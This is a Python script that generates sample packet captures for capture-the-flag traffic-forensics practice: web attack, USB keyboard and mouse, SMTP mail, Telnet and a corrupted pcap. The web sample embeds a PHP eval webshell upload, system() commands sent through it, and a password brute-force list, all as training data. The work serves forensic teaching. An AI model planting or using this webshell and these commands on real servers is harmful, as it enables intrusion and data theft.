# -*- coding: utf-8 -*-
"""
make_samples.py — 生成各题型的测试流量包(用于验证上面所有脚本能直接出解)

生成到 samples/ 目录:
  web_attack.pcap     WEB攻击:扫描器+目录爆破+账号爆破+webshell上传
  usb_keyboard.pcap   USB键盘:HID 键码输入 flag{...}(含无关USB设备流量)
  usb_mouse.pcap      USB鼠标:HID 位移轨迹画出 "FLAG" 字样
  mail.pcap           SMTP 邮件:base64 正文 + base64 附件藏 flag
  telnet.pcap         Telnet 明文登录(IAC 协商字节混入)
  broken.pcap         故意损坏的 pcap(魔数破坏+尾包截断) -> pcapfix 演示

用法: python make_samples.py
"""
import os
import re
import sys
import struct
import base64

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import pcaplib

HERE = os.path.dirname(os.path.abspath(__file__))
SAMPLES = os.path.join(HERE, 'samples')

# ===========================================================================
# 通用 pcap 写入
# ===========================================================================
def write_pcap(path, packets, linktype=pcaplib.LINKTYPE_ETHERNET):
    """packets: [(ts, raw_bytes)]"""
    with open(path, 'wb') as f:
        f.write(struct.pack('<IHHiIII', 0xa1b2c3d4, 2, 4, 0, 0, 262144, linktype))
        for ts, raw in packets:
            f.write(struct.pack('<IIII', int(ts), int((ts % 1) * 1e6), len(raw), len(raw)))
            f.write(raw)
    print('[+] 生成 %s (%d 包)' % (path, len(packets)))


def ip_checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack('>%dH' % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return (~s) & 0xffff


def tcp_frame(src_mac, dst_mac, src_ip, sport, dst_ip, dport,
              seq, ack, flags, payload=b'', window=8192, ipid=0x1234):
    tcp = struct.pack('>HHIIBBHHH', sport, dport, seq, ack, 5 << 4, flags,
                      window, 0, 0)
    pseudo = (ip2b(src_ip) + ip2b(dst_ip) + struct.pack('>BBH', 0, 6, len(tcp) + len(payload)))
    ck = ip_checksum(pseudo + tcp + payload)
    tcp = tcp[:16] + struct.pack('>H', ck) + tcp[18:]
    total = 20 + len(tcp) + len(payload)
    ip = struct.pack('>BBHHHBBH', 0x45, 0, total, ipid, 0x4000, 64, 6, 0) \
        + ip2b(src_ip) + ip2b(dst_ip)
    ip = ip[:10] + struct.pack('>H', ip_checksum(ip)) + ip[12:]
    eth = dst_mac + src_mac + b'\x08\x00'
    return eth + ip + tcp + payload


def ip2b(ip):
    return bytes(int(x) for x in ip.split('.'))


def mac(b):
    return bytes(b)


C_MAC = mac((0x00, 0x11, 0x22, 0x33, 0x44, 0x55))     # 攻击者
S_MAC = mac((0x00, 0xaa, 0xbb, 0xcc, 0xdd, 0xee))     # 服务器
C_IP = '10.0.0.66'
S_IP = '192.168.100.2'


class TCPConn(object):
    """模拟一条 TCP 连接,自动维护序列号,产出报文列表。"""

    def __init__(self, sport, ts0, cip=C_IP, sip=S_IP, sport_c=None):
        self.sport = sport          # 服务器端口
        self.cip, self.sip = cip, sip
        self.cport = sport_c or (40000 + sport % 1000)
        self.cseq, self.sseq = 1000, 5000
        self.ts = ts0
        self.pkts = []
        self.ipid = 0x1000

    def _adv(self, dt=0.002):
        self.ts += dt
        return self.ts

    def handshake(self):
        t = self._adv()
        self.pkts.append((t, tcp_frame(C_MAC, S_MAC, self.cip, self.cport, self.sip,
                                       self.sport, self.cseq, 0, 0x02, ipid=self.ipid)))
        t = self._adv()
        self.pkts.append((t, tcp_frame(S_MAC, C_MAC, self.sip, self.sport, self.cip,
                                       self.cport, self.sseq, self.cseq + 1, 0x12,
                                       ipid=self.ipid)))
        self.cseq += 1
        self.sseq += 1
        t = self._adv()
        self.pkts.append((t, tcp_frame(C_MAC, S_MAC, self.cip, self.cport, self.sip,
                                       self.sport, self.cseq, self.sseq, 0x10,
                                       ipid=self.ipid)))

    def send(self, data, direction='c2s', dt=0.01):
        """拆成 <=1400 字节的段发送"""
        off = 0
        while off < len(data) or off == 0:
            chunk = data[off:off + 1400]
            t = self._adv(dt)
            if direction == 'c2s':
                self.pkts.append((t, tcp_frame(C_MAC, S_MAC, self.cip, self.cport, self.sip,
                                               self.sport, self.cseq, self.sseq, 0x18,
                                               chunk, ipid=self.ipid)))
                self.cseq += len(chunk)
            else:
                self.pkts.append((t, tcp_frame(S_MAC, C_MAC, self.sip, self.sport, self.cip,
                                               self.cport, self.sseq, self.cseq, 0x18,
                                               chunk, ipid=self.ipid)))
                self.sseq += len(chunk)
            off += 1400
            self.ipid = (self.ipid + 1) & 0xffff
            if not chunk:
                break

    def teardown(self):
        t = self._adv()
        self.pkts.append((t, tcp_frame(C_MAC, S_MAC, self.cip, self.cport, self.sip,
                                       self.sport, self.cseq, self.sseq, 0x11)))
        t = self._adv()
        self.pkts.append((t, tcp_frame(S_MAC, C_MAC, self.sip, self.sport, self.cip,
                                       self.cport, self.sseq, self.cseq + 1, 0x11)))
        self.cseq += 1
        self.sseq += 1


def http_get(path, host='192.168.100.2', ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
             extra=''):
    return ('GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n'
            'Accept: */*\r\n%s\r\n' % (path, host, ua, extra)).encode()


def http_req(method, path, body=b'', host='192.168.100.2',
             ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64)', ct='application/x-www-form-urlencoded',
             extra=''):
    hdr = ('%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n'
           'Content-Type: %s\r\nContent-Length: %d\r\n%s\r\n'
           % (method, path, host, ua, ct, len(body), extra)).encode()
    return hdr + body


def http_resp(code, phrase, body=b'', ct='text/html', extra=''):
    hdr = ('HTTP/1.1 %s %s\r\nServer: nginx/1.14.0\r\nContent-Type: %s\r\n'
           'Content-Length: %d\r\n%s\r\n' % (code, phrase, ct, len(body), extra)).encode()
    return hdr + body


# ===========================================================================
# 1. WEB 攻击流量
# ===========================================================================
def make_web(path):
    pkts = []
    ts = 1600000000.0

    # --- 连接1: AWVS 扫描 ---
    c = TCPConn(80, ts, sport_c=41001)
    c.handshake()
    awvs_ua = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)'
    awvs_extra = 'Acunetix-Product: WVS/8.0 (Acunetix Web Vulnerability Scanner 8.0)\r\n' \
                 'Acunetix-Scanning-approval: 0332f544-bcbf-4b1a-9cbf-b845e3d97f11\r\n'
    for p in ['/', '/index.php?id=1', '/acunetix_wvs_security_test/xss.php?x=1',
              '/admin/', '/phpinfo.php?a=acunetix-wvs-test']:
        c.send(http_get(p, ua=awvs_ua, extra=awvs_extra))
        body = b'<html><title>Home</title>flag{h1_welcome_page}</html>' if p == '/' else b'<html>404 Not Found</html>'
        c.send(http_resp('200' if p == '/' else '404', 'OK' if p == '/' else 'Not Found', body), 's2c')
    c.teardown()
    pkts += c.pkts

    # --- 连接2: 目录爆破(dirbuster 特征 UA) ---
    c = TCPConn(80, ts + 10, sport_c=41002)
    c.handshake()
    dirs = ['/backup/', '/wp-admin/', '/administrator/', '/manage/', '/console/',
            '/admin/', '/admin/index.php', '/admin/login.php.bak', '/manager/html',
            '/dashboard/', '/secret/', '/test/', '/old/', '/1.php', '/a.zip']
    dirs += ['/admin/login_%d.php' % i for i in range(8)]
    for p in dirs:
        c.send(http_get(p, ua='Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; DirBuster-1.0-RC1)'))
        c.send(http_resp('404', 'Not Found', b'<h1>404</h1>'), 's2c', dt=0.003)
    # 爆破命中的后台地址
    c.send(http_get('/admin/login.php', ua='Mozilla/4.0 (compatible; MSIE 6.0; DirBuster-1.0-RC1)'))
    c.send(http_resp('200', 'OK',
                     b'<html><form action="login.php" method="post">'
                     b'user:<input name="username"> pass:<input name="password" type="password">'
                     b'<input type=submit></form></html>'), 's2c')
    c.teardown()
    pkts += c.pkts

    # --- 连接3: 账号爆破 + 成功登录 ---
    c = TCPConn(80, ts + 30, sport_c=41003)
    c.handshake()
    for user, pwd in [('admin', '123456'), ('admin', 'admin'), ('root', 'toor'),
                      ('admin', 'admin888'), ('admin', 'password')]:
        c.send(http_req('POST', '/admin/login.php',
                        ('username=%s&password=%s&submit=login' % (user, pwd)).encode()))
        c.send(http_resp('200', 'OK', b'<html>login failed: wrong password</html>'), 's2c', dt=0.005)
    # 成功的一次
    c.send(http_req('POST', '/admin/login.php', b'username=admin&password=admin123&submit=login'))
    c.send(http_resp('302', 'Found', b'', extra=
                     'Location: /admin/index.php\r\nSet-Cookie: PHPSESSID=8f14e45fceea167a5a36dedd4bea2543; path=/\r\n'),
           's2c')
    c.send(http_get('/admin/index.php', extra='Cookie: PHPSESSID=8f14e45fceea167a5a36dedd4bea2543\r\n'))
    c.send(http_resp('200', 'OK',
                     b'<html><h1>Welcome to admin panel</h1>'
                     b'<p>congrats! flag{welc0me_t0_admin}</p></html>'), 's2c')
    c.teardown()
    pkts += c.pkts

    # --- 连接4: webshell 上传 + 菜刀连接 ---
    c = TCPConn(80, ts + 60, sport_c=41004)
    c.handshake()
    boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
    shell = b'<?php @eval($_POST["cmd"]);?>'
    mp = (('--%s\r\nContent-Disposition: form-data; name="file"; filename="muma.php"\r\n'
           'Content-Type: application/octet-stream\r\n\r\n%s\r\n'
           '--%s\r\nContent-Disposition: form-data; name="submit"\r\n\r\nupload\r\n'
           '--%s--\r\n') % (boundary, shell.decode(), boundary, boundary)).encode()
    c.send(http_req('POST', '/upload.php', mp,
                    ct='multipart/form-data; boundary=%s' % boundary))
    c.send(http_resp('200', 'OK', b'<html>upload success: /uploads/muma.php</html>'), 's2c')
    # 菜刀/蚁剑样式连接
    c.send(http_req('POST', '/uploads/muma.php', b'cmd=system("ls");'))
    c.send(http_resp('200', 'OK', b'flag.txt\nindex.php\nmuma.php\n'), 's2c')
    c.send(http_req('POST', '/uploads/muma.php', b'cmd=system("cat flag.txt");'))
    c.send(http_resp('200', 'OK', b'flag{websh3ll_c0nnect3d}\n'), 's2c')
    c.teardown()
    pkts += c.pkts

    write_pcap(path, pkts)


# ===========================================================================
# 2. USB 键盘
# ===========================================================================
def usb_linux(ts, urb_id, pkt_type, xfer_type, epnum, devnum, busnum,
              flag_setup, flag_data, data=b'', setup=b'\x00' * 8, length=None):
    if length is None:
        length = len(data)
    hdr = struct.pack('<QBBBbHccqiiII8siiiI',
                      urb_id, ord(pkt_type), xfer_type, epnum, devnum, busnum,
                      bytes([flag_setup]), bytes([flag_data]),
                      int(ts), int((ts % 1) * 1e6), 0,
                      length, len(data), setup, 0, 0, 0, 0)
    return hdr + data


def key_report(mod, key, ts, dev=5):
    """键盘 interrupt IN 回调包(C),8字节报告"""
    return usb_linux(ts, 0xFFFF8800, 'C', 1, 0x81, dev, 1, 0x2d, 0x3d,
                     bytes([mod, 0, key, 0, 0, 0, 0, 0]), length=8)


def char_to_hid(c):
    """字符 -> (键码, 是否shift)"""
    lower = 'abcdefghijklmnopqrstuvwxyz1234567890'
    hid_base = [0x04 + i for i in range(26)] + [0x1e + i for i in range(10)]
    shift_pairs = {'!': '1', '@': '2', '#': '3', '$': '4', '%': '5',
                   '^': '6', '&': '7', '*': '8', '(': '9', ')': '0',
                   '_': '-', '+': '=', '{': '[', '}': ']', ':': ';',
                   '"': "'", '~': '`', '<': ',', '>': '.', '?': '/'}
    if c in lower:
        return hid_base[lower.index(c)], False
    if c.isupper():
        return hid_base[lower.index(c.lower())], True
    specials = {'\n': 0x28, ' ': 0x2c, '-': 0x2d, '=': 0x2e, '[': 0x2f,
                ']': 0x30, '\\': 0x31, ';': 0x33, "'": 0x34, '`': 0x35,
                ',': 0x36, '.': 0x37, '/': 0x38, '\t': 0x2b}
    if c in specials:
        return specials[c], False
    if c in shift_pairs:
        return specials[shift_pairs[c]], True
    return None, False


def type_text(text, ts_list):
    """把字符串变成键码包序列"""
    pkts = []
    for ts, c in zip(ts_list, text):
        key, shift = char_to_hid(c)
        if key is None:
            continue
        mod = 0x02 if shift else 0x00
        pkts.append((ts, key_report(mod, key, ts)))
    return pkts


def make_usb_keyboard(path):
    ts = 1610000000.0
    pkts = []
    # 无关 USB 设备流量:控制传输(dev=3, 摄像头枚举)+ 鼠标4字节报告(dev=6)
    for i in range(6):
        ts += 0.003
        noise = usb_linux(ts, 0xFFFF1000 + i, 'S', 2, 0x00, 3, 1, 0x73, 0x3e,
                          setup=b'\x80\x06\x00\x01\x00\x00\x40\x00')
        pkts.append((ts, noise))
        ts += 0.004
        resp = usb_linux(ts, 0xFFFF1000 + i, 'C', 2, 0x80, 3, 1, 0x2d, 0x3d,
                         b'\x12\x01\x00\x02\x00\x00\x00\x40')
        pkts.append((ts, resp))
        ts += 0.005
        mouse = usb_linux(ts, 0xFFFF2000 + i, 'C', 1, 0x81, 6, 1, 0x2d, 0x3d,
                          bytes([0x00, 0x02, 0xff, 0x00]), length=4)
        pkts.append((ts, mouse))

    # 键盘输入: flag{u5b_k3yb0ard_ftw}  (含回车)
    flag = 'flag{u5b_k3yb0ard_ftw}\n'
    ts_list = []
    t = ts + 0.1
    for _ in flag:
        ts_list.append(t)
        t += 0.08 + (hash(_) % 3) * 0.01
    pkts += type_text(flag, ts_list)

    # 再混入一点鼠标噪声
    for i in range(3):
        ts += 0.01
        pkts.append((ts, usb_linux(ts, 0xFFFF3000 + i, 'C', 1, 0x81, 6, 1, 0x2d, 0x3d,
                                   bytes([0x01, 0xfe, 0x03, 0x00]), length=4)))
    pkts.sort(key=lambda x: x[0])
    write_pcap(path, pkts, linktype=pcaplib.LINKTYPE_USB_LINUX)


# ===========================================================================
# 3. USB 鼠标(画出 FLAG 字样)
# ===========================================================================
LETTERS = {
    'F': [[(0, 0), (0, 60)], [(0, 0), (30, 0)], [(0, 30), (24, 30)]],
    'L': [[(0, 0), (0, 60)], [(0, 60), (30, 60)]],
    'A': [[(0, 60), (15, 0), (30, 60)], [(6, 42), (24, 42)]],
    'G': [[(30, 18), (30, 6), (12, 0), (2, 14), (0, 32), (6, 52), (26, 60),
           (30, 46), (30, 36), (18, 34)]],
}


def make_usb_mouse(path):
    ts = 1620000000.0
    pkts = []
    urb = 0xAAAA0000

    def move(dx, dy, btn):
        nonlocal ts, urb
        ts += 0.004
        urb += 1
        pkts.append((ts, usb_linux(ts, urb, 'C', 1, 0x81, 7, 1, 0x2d, 0x3d,
                                   bytes([btn, dx & 0xff, dy & 0xff, 0]), length=4)))

    # 光标先移到起点(不按键)
    x, y = 0, 100
    tx, ty = 20, 20
    move(tx - x, ty - y, 0)
    x, y = tx, ty

    for li, ch in enumerate('FLAG'):
        ox = li * 60
        for stroke in LETTERS[ch]:
            sx, sy = stroke[0]
            move(ox + sx - x, sy - y, 0)          # 抬笔移动
            x, y = ox + sx, sy
            move(0, 0, 1)                          # 按下左键
            x0, y0 = x, y                          # 线段起点(循环里 x,y 会变)
            for px, py in stroke[1:]:
                ax, ay = ox + px, py               # 字母局部坐标 -> 绝对坐标
                # 沿线插值,每步约 3 像素
                dist = max(abs(ax - x0), abs(ay - y0))
                steps = max(1, dist // 3)
                for s in range(1, steps + 1):
                    nx = x0 + (ax - x0) * s // steps
                    ny = y0 + (ay - y0) * s // steps
                    move(nx - x, ny - y, 1)
                    x, y = nx, ny
                x0, y0 = ax, ay                    # 下一段从本段终点继续(折线)
            move(0, 0, 0)                          # 松开
    write_pcap(path, pkts, linktype=pcaplib.LINKTYPE_USB_LINUX)


# ===========================================================================
# 4. SMTP 邮件
# ===========================================================================
def make_mail(path):
    ts = 1630000000.0
    pkts = []
    c = TCPConn(25, ts, sport_c=41100)
    c.handshake()
    mail_body = (
        'From: =?utf-8?B?' + base64.b64encode('老板'.encode()).decode() + '?= <boss@ctf.local>\r\n'
        'To: alice@ctf.local\r\n'
        'Subject: =?utf-8?B?' + base64.b64encode('重要文件请查收'.encode()).decode() + '?=\r\n'
        'MIME-Version: 1.0\r\n'
        'Content-Type: multipart/mixed; boundary="BOUND123X"\r\n'
        '\r\n'
        '--BOUND123X\r\n'
        'Content-Type: text/plain; charset=utf-8\r\n'
        'Content-Transfer-Encoding: base64\r\n'
        '\r\n' +
        base64.b64encode('附件里是你要的东西,密码注意保存。\r\n'.encode()).decode() + '\r\n'
        '--BOUND123X\r\n'
        'Content-Type: application/octet-stream; name="secret.txt"\r\n'
        'Content-Disposition: attachment; filename="secret.txt"\r\n'
        'Content-Transfer-Encoding: base64\r\n'
        '\r\n' +
        base64.b64encode(b'the password is: flag{ma1l_h1d3s_secr3t}\n').decode() + '\r\n'
        '--BOUND123X--\r\n')

    smtp = (
        '220 mail.ctf.local ESMTP Postfix\r\n'
        'EHLO client.attacker.local\r\n'
        '250-mail.ctf.local\r\n250-PIPELINING\r\n250 OK\r\n'
        'MAIL FROM:<boss@ctf.local>\r\n250 OK\r\n'
        'RCPT TO:<alice@ctf.local>\r\n250 OK\r\n'
        'DATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n'
        + mail_body + '.\r\n'
        '250 OK: queued as A17D3F\r\n'
        'QUIT\r\n'
        '221 Bye\r\n')
    # 拆两个方向发
    c.send(b'EHLO client.attacker.local\r\nMAIL FROM:<boss@ctf.local>\r\n'
           b'RCPT TO:<alice@ctf.local>\r\nDATA\r\n')
    c.send(('220 mail.ctf.local ESMTP Postfix\r\n250-mail.ctf.local\r\n250 OK\r\n'
            '250 OK\r\n250 OK\r\n354 End data with <CR><LF>.<CR><LF>\r\n').encode(), 's2c')
    c.send(mail_body.encode() + b'.\r\nQUIT\r\n')
    c.send(b'250 OK: queued as A17D3F\r\n221 Bye\r\n', 's2c')
    c.teardown()
    pkts += c.pkts
    write_pcap(path, pkts)


# ===========================================================================
# 5. Telnet
# ===========================================================================
def make_telnet(path):
    ts = 1640000000.0
    pkts = []
    c = TCPConn(23, ts, sport_c=41200)
    c.handshake()
    # IAC 协商
    iac_srv = bytes([0xFF, 0xFD, 0x18, 0xFF, 0xFD, 0x20, 0xFF, 0xFB, 0x03])  # DO TERM, DO NAWS, WILL SGA
    iac_cli = bytes([0xFF, 0xFB, 0x18, 0xFF, 0xFA, 0x18, 0x00]) + b'xterm' \
        + bytes([0xFF, 0xF0, 0xFF, 0xFC, 0x20])
    c.send(iac_cli)
    c.send(iac_srv, 's2c')
    # 登录
    c.send(b'Ubuntu 18.04.5 LTS ctf-server login: ', 's2c')
    c.send(b'root\r\n')
    c.send(b'Password: ', 's2c')
    c.send(b'toor\r\n')
    c.send(b'Welcome!\r\nroot@ctf:~$ ', 's2c')
    c.send(b'ls\r\n')
    c.send(b'flag.txt  note.txt\r\nroot@ctf:~$ ', 's2c')
    c.send(b'cat flag.txt\r\n')
    c.send(b'flag{telnet_1s_plaint3xt}\r\nroot@ctf:~$ ', 's2c')
    c.teardown()
    pkts += c.pkts
    write_pcap(path, pkts)


# ===========================================================================
# 6. 故意损坏的 pcap
# ===========================================================================
def make_broken(path):
    tmp = os.path.join(SAMPLES, '_tmp_web.pcap')
    make_web(tmp)
    with open(tmp, 'rb') as f:
        data = f.read()
    os.remove(tmp)
    # 破坏魔数 + 截断最后一个包
    broken = b'\xde\xad\xbe\xef' + data[4:]
    broken = broken[:len(broken) - 37]
    with open(path, 'wb') as f:
        f.write(broken)
    print('[+] 生成 %s (魔数破坏+尾包截断, %d 字节)' % (path, len(broken)))


def main():
    os.makedirs(SAMPLES, exist_ok=True)
    make_web(os.path.join(SAMPLES, 'web_attack.pcap'))
    make_usb_keyboard(os.path.join(SAMPLES, 'usb_keyboard.pcap'))
    make_usb_mouse(os.path.join(SAMPLES, 'usb_mouse.pcap'))
    make_mail(os.path.join(SAMPLES, 'mail.pcap'))
    make_telnet(os.path.join(SAMPLES, 'telnet.pcap'))
    make_broken(os.path.join(SAMPLES, 'broken.pcap'))
    print('\n[*] 全部样例生成完毕,可以逐个运行脚本验证。')


if __name__ == '__main__':
    main()
